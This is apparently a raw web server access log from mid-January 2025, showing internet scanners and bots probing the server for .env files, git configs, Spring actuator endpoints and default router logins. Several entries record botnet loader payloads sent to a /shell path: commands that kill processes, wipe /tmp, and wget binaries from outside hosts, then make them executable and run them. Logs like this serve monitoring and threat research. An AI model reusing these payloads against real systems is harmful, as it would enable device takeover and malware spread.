78.153.140.203 - - [16/Jan/2025:23:02:49 +0000] "GET /Web/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU; AppleWebKit/534.16; KHTML; like Gecko; Chrome/10.0.648.11;Safari/534.16)"
206.168.34.206 - - [16/Jan/2025:23:13:19 +0000] "\x16\x03\x01" 400 524 "-" "-"
206.168.34.206 - - [16/Jan/2025:23:13:25 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.206 - - [16/Jan/2025:23:13:33 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.206 - - [16/Jan/2025:23:13:33 +0000] "GET / HTTP/1.1" 200 966 "http://34.155.227.229/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.206 - - [16/Jan/2025:23:13:33 +0000] "PRI * HTTP/2.0" 400 524 "-" "-"
87.120.115.119 - - [16/Jan/2025:23:20:14 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; Android 4.3; SPH-L710 Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
95.214.55.226 - - [16/Jan/2025:23:40:04 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
104.236.3.45 - - [15/Jan/2025:00:28:18 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 129.159.107.197/jaws;sh+/tmp/jaws" 400 524 "-" "-"
123.108.152.241 - - [15/Jan/2025:00:32:55 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
49.0.65.53 - - [15/Jan/2025:00:54:42 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.147 - - [15/Jan/2025:00:56:55 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [15/Jan/2025:00:56:55 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
179.43.191.146 - - [15/Jan/2025:01:39:12 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
170.64.159.7 - - [15/Jan/2025:01:49:21 +0000] "GET /.git/config HTTP/1.1" 302 387 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
92.255.57.58 - - [15/Jan/2025:02:00:12 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
46.19.138.234 - - [15/Jan/2025:02:06:04 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
164.52.24.188 - - [15/Jan/2025:02:07:07 +0000] "\x16\x03\x01\x02" 400 524 "-" "-"
164.52.24.188 - - [15/Jan/2025:02:07:28 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
164.52.24.188 - - [15/Jan/2025:02:07:32 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
164.52.24.188 - - [15/Jan/2025:02:07:35 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
164.52.24.188 - - [15/Jan/2025:02:07:40 +0000] "GET / HTTP/1.1" 200 1684 "http://34.155.227.229/favicon.ico" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
87.120.120.18 - - [15/Jan/2025:02:22:09 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 6.2; ARM; Trident/7.0; Touch; rv:11.0; WPDesktop; NOKIA; Lumia 635) like Gecko"
78.153.140.149 - - [15/Jan/2025:02:31:11 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:02:31:11 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
92.255.57.58 - - [15/Jan/2025:02:37:50 +0000] "GET /actuator/gateway/routes HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.255.57.58 - - [15/Jan/2025:02:37:51 +0000] "GET / HTTP/1.1" 200 966 "http://34.155.227.229:80/actuator/gateway/routes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
78.153.140.151 - - [15/Jan/2025:03:10:25 +0000] "GET /.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080718 Ubuntu/8.04 (hardy) Firefox/2.0.0.16"
78.153.140.151 - - [15/Jan/2025:03:10:25 +0000] "\x16\x03\x01" 400 524 "-" "-"
78.153.140.151 - - [15/Jan/2025:03:10:25 +0000] "GET /whturk/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.2.10) Gecko/20100914 SUSE/3.6.10-0.3.1 Firefox/3.6.10"
78.153.140.151 - - [15/Jan/2025:03:10:25 +0000] "GET /staging.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:51.0) Gecko/20100101 Firefox/51.0"
78.153.140.151 - - [15/Jan/2025:03:10:25 +0000] "GET /ubuntu/.env HTTP/1.1" 302 331 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; 360SE)"
78.153.140.151 - - [15/Jan/2025:03:10:25 +0000] "GET /prisma/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; U; Linux i686 (x86_64); zh-TW; rv:1.8.0.6) Gecko/20060728 Firefox/1.5.0.6"
78.153.140.151 - - [15/Jan/2025:03:10:26 +0000] "GET /travis/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16"
78.153.140.151 - - [15/Jan/2025:03:10:26 +0000] "GET /secret/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.25 (KHTML, like Gecko) Version/11.0 Mobile/15A5304j Safari/604.1"
78.153.140.151 - - [15/Jan/2025:03:10:26 +0000] "GET /parity/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; Android 7.0; LGMS550 Build/NRD90U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36"
78.153.140.151 - - [15/Jan/2025:03:10:26 +0000] "GET /addons/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPad; CPU OS 9_3_5 like Mac OS X) AppleWebKit/601.1 (KHTML, like Gecko) CriOS/63.0.3239.73 Mobile/13G36 Safari/601.1.46"
78.153.140.151 - - [15/Jan/2025:03:10:27 +0000] "GET /secure/.env HTTP/1.1" 302 331 "-" "Mozilla/6.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:2.0.0.0) Gecko/20061028 Firefox/3.0"
78.153.140.151 - - [15/Jan/2025:03:10:27 +0000] "GET /module/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; %lang2%) adbeat.com/policy AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B360 Safari/531.21.10"
78.153.140.151 - - [15/Jan/2025:03:10:27 +0000] "GET /widget/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.861.0 Safari/535.2"
78.153.140.151 - - [15/Jan/2025:03:10:27 +0000] "GET /drupal/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SGH-T999N Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
78.153.140.151 - - [15/Jan/2025:03:10:28 +0000] "GET /kibana/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G955F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.2 Chrome/56.0.2924.87 Mobile Safari/537.36"
78.153.140.151 - - [15/Jan/2025:03:10:28 +0000] "GET /jsrelay/.env HTTP/1.1" 302 331 "-" "Opera/9.64 (Windows NT 6.0; U; pl) Presto/2.1.1"
78.153.140.151 - - [15/Jan/2025:03:10:28 +0000] "GET /layouts/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:16.0) Gecko/20100101 Firefox/16.0"
78.153.140.151 - - [15/Jan/2025:03:10:28 +0000] "GET /website/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en_CA) AppleWebKit/125.4 (KHTML, like Gecko) Safari/125.9"
78.153.140.151 - - [15/Jan/2025:03:10:28 +0000] "GET /plugins/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN) AppleWebKit/533+ (KHTML, like Gecko)"
78.153.140.151 - - [15/Jan/2025:03:10:29 +0000] "GET /profile/.env HTTP/1.1" 302 331 "-" "Opera/9.80 (Android 2.2.1; Linux; Opera Mobi/ADR-1301071820) Presto/2.11.355 Version/12.10"
78.153.140.151 - - [15/Jan/2025:03:10:29 +0000] "GET /oldsite/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; CrOS x86_64 8172.56.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
78.153.140.151 - - [15/Jan/2025:03:10:30 +0000] "GET /webroot/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36"
78.153.140.151 - - [15/Jan/2025:03:10:31 +0000] "GET /sistema/.env HTTP/1.1" 302 331 "-" "Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; .NET CLR 1.0.3705)"
78.153.140.151 - - [15/Jan/2025:03:10:31 +0000] "GET /ikiwiki/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; Android 5.1.1; 5054N Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.2125.102 Mobile Safari/537.36"
78.153.140.151 - - [15/Jan/2025:03:10:31 +0000] "GET /twitter/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; fr-fr) AppleWebKit/312.1.1 (KHTML, like Gecko) Safari/312"
78.153.140.151 - - [15/Jan/2025:03:10:32 +0000] "GET /widgets/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; U; Linux Gentoo i686; pl; rv:1.8.0.8) Gecko/20061219 Firefox/1.5.0.8"
78.153.140.151 - - [15/Jan/2025:03:10:32 +0000] "GET /monerod/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; Android 5.1; Z820 Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Mobile Safari/537.36"
78.153.140.151 - - [15/Jan/2025:03:10:32 +0000] "GET /outputs/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.50 Safari/525.19"
78.153.140.151 - - [15/Jan/2025:03:10:33 +0000] "GET /classes/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.78.2 (KHTML, like Gecko) WebClip/9537.85.15.2 Safari/9537.85.15.3"
78.153.140.151 - - [15/Jan/2025:03:10:33 +0000] "GET /fileweb/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.11 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.11"
78.153.140.151 - - [15/Jan/2025:03:10:33 +0000] "GET /Backend/.env HTTP/1.1" 302 331 "-" "Opera/9.80 (Windows NT 6.1; WOW64; U; en) Presto/2.10.289 Version/12.02"
78.153.140.151 - - [15/Jan/2025:03:10:33 +0000] "GET /sendgrid/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36"
78.153.140.151 - - [15/Jan/2025:03:10:34 +0000] "GET /dotfiles/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.87 Safari/537.36 OPR/37.0.2178.32"
78.153.140.151 - - [15/Jan/2025:03:10:34 +0000] "GET /profiles/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.812.0 Safari/535.1"
78.153.140.151 - - [15/Jan/2025:03:10:34 +0000] "GET /examples/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.2) Gecko/2008092809 Gentoo Firefox/3.0.2"
78.153.140.151 - - [15/Jan/2025:03:10:34 +0000] "GET /var/backup/.env HTTP/1.1" 302 331 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MDDC; BRI/1; .NET4.0C; BRI/2; AskTbX-SD/5.14.1.20007; .NET4.0E)"
78.153.140.151 - - [15/Jan/2025:03:10:35 +0000] "GET /lib64/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr-be; rv:1.9.0.13) Gecko/2009073022 Firefox/3.0.13"
78.153.140.151 - - [15/Jan/2025:03:10:35 +0000] "GET /2024/.env HTTP/1.1" 302 331 "-" "Safari/537.36 (Windows NT 6.2; WOW64) AppleWebKit/537.36"
92.255.57.58 - - [15/Jan/2025:03:16:01 +0000] "\x16\x03\x01\x05\xa8\x01" 400 524 "-" "-"
66.175.213.4 - - [15/Jan/2025:03:45:35 +0000] "\x16\x03\x01" 400 524 "-" "-"
78.153.140.149 - - [15/Jan/2025:03:56:15 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:03:56:15 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
64.62.197.236 - - [15/Jan/2025:04:10:34 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"
64.62.197.229 - - [15/Jan/2025:04:12:29 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
64.62.197.236 - - [15/Jan/2025:04:13:01 +0000] "GET /geoserver/web/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"
31.220.1.144 - - [15/Jan/2025:04:33:47 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
141.98.11.119 - - [15/Jan/2025:04:37:33 +0000] "GET /shell?killall+-9+arm7;killall+-9+arm4;killall+-9+arm;killall+-9+/bin/sh;killall+-9+/bin/sh;killall+-9+/z/bin;killall+-9+/bin/bash;cd+/tmp;rm+vevhea4+ivwebcda7;wget+http:/\\/dihvbe.theeyefirewall.su/ivwebcda7;chmod+777+ivwebcda7;./ivwebcda7+jaws;wget+http:/\\/dihvbe.theeyefirewall.su/vevhea4;chmod+777+vevhea4;./vevhea4+jaws HTTP/1.1" 302 387 "-" "KrebsOnSecurity"
78.153.140.149 - - [15/Jan/2025:04:52:37 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:04:52:37 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
95.214.55.226 - - [15/Jan/2025:05:01:01 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
83.222.191.146 - - [15/Jan/2025:05:05:13 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.180.140.101 - - [15/Jan/2025:05:09:19 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
76.244.18.43 - - [15/Jan/2025:05:39:25 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
117.231.142.178 - - [15/Jan/2025:05:41:19 +0000] "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0" 302 350 "-" "-"
172.104.11.46 - - [15/Jan/2025:05:46:05 +0000] "\x16\x03\x01" 400 524 "-" "-"
141.98.11.119 - - [15/Jan/2025:05:48:11 +0000] "GET /shell?killall+-9+arm7;killall+-9+arm4;killall+-9+arm;killall+-9+/bin/sh;killall+-9+/bin/sh;killall+-9+/z/bin;killall+-9+/bin/bash;cd+/tmp;rm+vevhea4+ivwebcda7;wget+http:/\\/dihvbe.theeyefirewall.su/ivwebcda7;chmod+777+ivwebcda7;./ivwebcda7+jaws;wget+http:/\\/dihvbe.theeyefirewall.su/vevhea4;chmod+777+vevhea4;./vevhea4+jaws HTTP/1.1" 302 387 "-" "KrebsOnSecurity"
5.181.190.248 - - [15/Jan/2025:06:05:35 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [15/Jan/2025:06:05:35 +0000] "GET / HTTP/1.1" 200 1742 "http://34.155.227.229:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
35.240.127.158 - - [15/Jan/2025:06:06:09 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
178.215.236.132 - - [15/Jan/2025:06:07:43 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (OS/2; Warp 4.5; rv:24.0) Gecko/20100101 Firefox/24.0"
147.185.132.15 - - [15/Jan/2025:06:12:04 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
172.169.6.20 - - [15/Jan/2025:06:32:39 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
31.13.224.222 - - [15/Jan/2025:06:33:01 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_2) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.186 Safari/535.1"
31.13.224.36 - - [15/Jan/2025:06:38:59 +0000] "GET /.git/config HTTP/1.1" 302 387 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
142.93.221.56 - - [15/Jan/2025:06:39:14 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.2.1) Gecko/20100101 Firefox/52.2.1"
78.153.140.149 - - [15/Jan/2025:06:40:33 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:06:40:33 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
141.98.11.119 - - [15/Jan/2025:06:47:33 +0000] "GET /shell?killall+-9+arm7;killall+-9+arm4;killall+-9+arm;killall+-9+/bin/sh;killall+-9+/bin/sh;killall+-9+/z/bin;killall+-9+/bin/bash;cd+/tmp;rm+vevhea4+ivwebcda7;wget+http:/\\/dihvbe.theeyefirewall.su/ivwebcda7;chmod+777+ivwebcda7;./ivwebcda7+jaws;wget+http:/\\/dihvbe.theeyefirewall.su/vevhea4;chmod+777+vevhea4;./vevhea4+jaws HTTP/1.1" 302 387 "-" "KrebsOnSecurity"
78.153.140.149 - - [15/Jan/2025:07:41:25 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:07:41:26 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
36.39.153.244 - - [15/Jan/2025:08:00:35 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
46.19.138.234 - - [15/Jan/2025:08:08:36 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.224 - - [15/Jan/2025:08:35:55 +0000] "GET /.env HTTP/1.1" 302 331 "-" "Opera/9.80 (Windows NT 6.1) Presto/2.12.388 Version/12.16"
78.153.140.224 - - [15/Jan/2025:08:35:55 +0000] "\x16\x03\x01" 400 524 "-" "-"
91.188.223.159 - - [15/Jan/2025:08:38:46 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
179.43.191.146 - - [15/Jan/2025:08:45:23 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
62.84.100.218 - - [15/Jan/2025:09:14:54 +0000] "GET /env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
62.84.100.218 - - [15/Jan/2025:09:14:56 +0000] "GET /actuator/env HTTP/1.1" 302 292 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
62.84.100.218 - - [15/Jan/2025:09:14:56 +0000] "GET /admin/actuator/env HTTP/1.1" 302 292 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.2.20"
62.84.100.218 - - [15/Jan/2025:09:14:58 +0000] "GET /api/env HTTP/1.1" 302 292 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13.0) AppleWebKit/617.28 (KHTML, like Gecko) Version/17.0 Safari/617.28"
62.84.100.218 - - [15/Jan/2025:09:15:00 +0000] "GET /admin/env HTTP/1.1" 302 292 "-" "Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
62.84.100.218 - - [15/Jan/2025:09:15:00 +0000] "GET /api/actuator/env HTTP/1.1" 302 292 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.7.24"
78.153.140.149 - - [15/Jan/2025:09:30:48 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:09:30:48 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
165.154.118.215 - - [15/Jan/2025:09:34:58 +0000] "\x16\x03\x01\x01\x17\x01" 400 524 "-" "-"
165.154.118.215 - - [15/Jan/2025:09:35:09 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
165.154.118.215 - - [15/Jan/2025:09:35:14 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
165.154.118.215 - - [15/Jan/2025:09:35:15 +0000] "GET / HTTP/1.1" 200 947 "http://34.155.227.229/favicon.ico" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
165.154.118.215 - - [15/Jan/2025:09:35:15 +0000] "GET /robots.txt HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
165.154.118.215 - - [15/Jan/2025:09:35:15 +0000] "GET / HTTP/1.1" 200 947 "http://34.155.227.229/robots.txt" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
165.154.118.215 - - [15/Jan/2025:09:35:16 +0000] "GET /sitemap.xml HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
165.154.118.215 - - [15/Jan/2025:09:35:16 +0000] "GET / HTTP/1.1" 200 947 "http://34.155.227.229/sitemap.xml" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
165.154.118.215 - - [15/Jan/2025:09:35:16 +0000] "GET /js/brand.js HTTP/1.1" 200 514 "-" "Go-http-client/1.1"
165.154.118.215 - - [15/Jan/2025:09:35:16 +0000] "GET /js/login.js HTTP/1.1" 200 866 "-" "Go-http-client/1.1"
165.154.118.215 - - [15/Jan/2025:09:35:17 +0000] "GET /config.json HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
::1 - - [15/Jan/2025:09:35:22 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
87.120.115.119 - - [15/Jan/2025:09:37:54 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (OS/2; Warp 4.5; rv:31.0) Gecko/20100101 Firefox/31.0"
24.153.152.246 - - [15/Jan/2025:09:57:57 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
